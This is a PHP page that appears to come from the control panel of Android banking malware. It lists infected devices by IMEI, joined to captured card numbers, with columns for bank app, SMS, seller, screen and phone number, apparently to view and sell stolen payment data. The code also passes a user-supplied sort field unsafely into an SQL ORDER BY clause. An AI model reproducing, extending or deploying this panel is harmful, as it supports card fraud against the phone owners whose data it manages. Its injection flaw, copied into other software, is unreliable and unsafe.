<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php");  
    return;
}  
?>
<?php
if ($_GET['sort'] == ""){
    $sort = 'info2';
}
else{
    $sort = $mysqli->real_escape_string($_GET['sort']);
}

$html = '';
$html_table = '';


$query = "SELECT kliets.*, cc_info.CARD from `kliets` join cc_info on cc_info.IMEI=kliets.IMEI where kliets.info2 != '' or cc_info.CARD != '' ";    
$result = $mysqli->query($query);
$users_on_page="20";

$count = $result->num_rows;
$total = ceil($count / $users_on_page);

// страницы
if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);

$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
$first = $p*$users_on_page-$users_on_page;
#$query3 = "select * from `kliets` WHERE info2 != '' ";
$query3 = "SELECT kliets.*, cc_info.CARD from `kliets` join cc_info on cc_info.IMEI=kliets.IMEI where kliets.info2 != '' or cc_info.CARD != '' ORDER BY `{$sort}` DESC limit $first, $users_on_page ";


if (isset($_SESSION['cards'])) {
    $conf = $_SESSION['cards'];
  } else {
    $conf = array("imei" => true,
      "android" => true,
      "country" => true,
      "seller" => true,
      "online" => true,
      "lastcon" => true,
      "bankapp" => true,
      "card" => true,
      "sms" => true,
      "firstcon" => false,
      "bank" => true,
      "comment" => true,
      "screen" => false,
      "number" => false,
      "model" => false);
  }

$sql = "SELECT kliets.*, cc_info.CARD from `kliets` join cc_info on cc_info.IMEI=kliets.IMEI where kliets.info2 != '' or cc_info.CARD != '' ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
$html_table = getBigTable('cards', $sql, $mysqli);

if ($_SESSION["wide-mode"] == "true"){
    $widemode = "checked";
} else {
    $widemode = "";
}

$html = file_get_contents("templates/cards.tpl");
$html = str_replace('%%PLACE_TOTAL_CARDS_HERE%%', $count, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);
$html = str_replace('%%PLACE_WIDEMODE_HERE%%', $widemode, $html);
//$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_BOTTOM_LINKS_HERE%%', pages_bottom("card",$total,$p,$sort), $html);

# set chechboxes
foreach ($conf as $key => $value) {
    if ($value) {
        $check = "checked";
    } else {
        $check = "";
    }
    $placeholder = '%%PLACE_'.$key.'_CHECKBOX_HERE%%';
    $html = str_replace($placeholder, $check, $html);
}

echo $html;

?>

